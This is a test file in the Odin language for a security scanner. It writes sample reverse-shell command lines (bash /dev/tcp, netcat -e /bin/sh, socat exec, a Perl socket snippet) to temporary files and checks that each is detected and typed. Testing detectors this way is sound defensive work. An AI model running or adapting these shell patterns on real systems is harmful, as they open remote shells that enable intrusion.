package test

import "core:fmt"
import "core:os"
import "core:strings"
import "core:testing"

import "../src/security"

write_reverse_shell_file :: proc(dir: string, name: string, content: string) -> string {
	path := strings.concatenate({dir, "/", name})
	os.write_entire_file(path, transmute([]u8)content)
	return path
}

@(test)
test_reverse_shell_detection_patterns :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	cases := []struct{
		line: string,
		expected: security.Reverse_Shell_Type,
	}{
		{"bash -c 'echo ok >/dev/tcp/127.0.0.1/4444'", .Bash_TCP},
		{"bash -c 'echo ok >/dev/udp/127.0.0.1/4444'", .Bash_UDP},
		{"nc -e /bin/sh 127.0.0.1 4444", .Netcat},
		{"nc -e /bin/bash 127.0.0.1 4444", .Netcat},
		{"netcat -e /bin/sh 127.0.0.1 4444", .Netcat},
		{"socat exec:/bin/sh tcp:127.0.0.1:4444", .Socat},
		{"python -c \"import socket,subprocess\"", .Python},
		{"perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); open(STDIN,\">&S\")'", .Perl},
	}

	for case, idx in cases {
		temp_dir := setup_test_environment(fmt.tprintf("reverse_shell_%d", idx))
		defer teardown_test_environment(temp_dir)

		path := write_reverse_shell_file(temp_dir, fmt.tprintf("shell_%d.sh", idx), case.line)
		defer delete(path)

		result := security.scan_module(temp_dir, security.Scan_Options{})
		defer security.cleanup_scan_result(&result)

		testing.expect(t, result.critical_count > 0, "reverse shell pattern should be critical")
		testing.expect(t, len(result.reverse_shell_findings) > 0, "reverse shell findings should be recorded")

		found_type := false
		for finding in result.reverse_shell_findings {
			if finding.shell_type == case.expected {
				found_type = true
				break
			}
		}
		testing.expect(t, found_type, "expected reverse shell type not detected")
	}
}
